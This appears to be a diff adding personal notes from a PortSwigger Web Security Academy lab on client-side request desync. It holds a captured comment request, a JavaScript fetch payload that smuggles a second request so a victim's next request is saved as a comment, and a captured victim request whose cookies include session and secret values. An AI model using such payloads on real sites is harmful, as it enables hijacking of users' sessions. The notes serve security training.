@@ -1,0 +1,42 @@
+POST /en/post/comment HTTP/1.1
+Host: 0a8b008f0425f585c07e1e22000d0069.web-security-academy.net
+Cookie: session=ZNMlrJmnTbarFd8ZW284EleN8ylwGMpa; _lab_analytics=cOgaKJCtxG53CuqNEuzWspsCAal6ZPzVFbVh9lyCWY35cy9kodquzdgqBSWD8m8wD1VkgVI32ppJzWYr5SSipURAGNIo7yRHEtgybpg7d8hhRVbE9EyXQcfMUsbUtkdAM7M4ksQkKYvddvFDGeHBfluWd365OlkHqt2Qu105Q7mJyf1utsv9pw3GM4czG7bN2Ynjv9iV8NCJ2jYmNIs8TTPP7s6RI0XvdCePJtvA2p9OCgQkrdw1CJZAdw0nqdWZ
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 125
+Origin: https://0a8b008f0425f585c07e1e22000d0069.web-security-academy.net
+Dnt: 1
+Referer: https://0a8b008f0425f585c07e1e22000d0069.web-security-academy.net/en/post?postId=2
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+
+csrf=n3Q5T7MkPbcA8190TpdG3sQBx41JziaF&postId=2&comment=test&name=pwned&email=pwned%40gmail.com&website=http%3A%2F%2Fpwned.com
+
+
+## Exploit
+<script>
+fetch('https://0a8b008f0425f585c07e1e22000d0069.web-security-academy.net', {
+        method: 'POST',
+        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a8b008f0425f585c07e1e22000d0069.web-security-academy.net\r\nCookie: session=ZNMlrJmnTbarFd8ZW284EleN8ylwGMpa; _lab_analytics=cOgaKJCtxG53CuqNEuzWspsCAal6ZPzVFbVh9lyCWY35cy9kodquzdgqBSWD8m8wD1VkgVI32ppJzWYr5SSipURAGNIo7yRHEtgybpg7d8hhRVbE9EyXQcfMUsbUtkdAM7M4ksQkKYvddvFDGeHBfluWd365OlkHqt2Qu105Q7mJyf1utsv9pw3GM4czG7bN2Ynjv9iV8NCJ2jYmNIs8TTPP7s6RI0XvdCePJtvA2p9OCgQkrdw1CJZAdw0nqdWZ\r\nContent-Length: 800\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=n3Q5T7MkPbcA8190TpdG3sQBx41JziaF&postId=2&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
+        mode: 'cors',
+        credentials: 'include',
+    }).catch(() => {
+        fetch('https://0a8b008f0425f585c07e1e22000d0069.web-security-academy.net/capture-me', {
+        mode: 'no-cors',
+        credentials: 'include'
+    })
+})
+</script>
+
+
+## Stoll
+GET /capture-me HTTP/1.1 Host: 0a8b008f0425f585c07e1e22000d0069.web-security-academy.net Connection: keep-alive sec-ch-ua: sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36 sec-ch-ua-platform: Accept: */* Sec-Fetch-Site: same-site Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty Referer: https://exploit-0a1f00790415f543c0871e9e017900ab.web-security-academy.net/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=lS11cnhOnrl4Va8IJOOC1z0PjkYktamM; secret=OiHDstFosTyKWI46chkvYJHH9fffcZyN; session=cFuzayEDIftolGxEj2H55wC1bsE6h1M3; _lab_
+
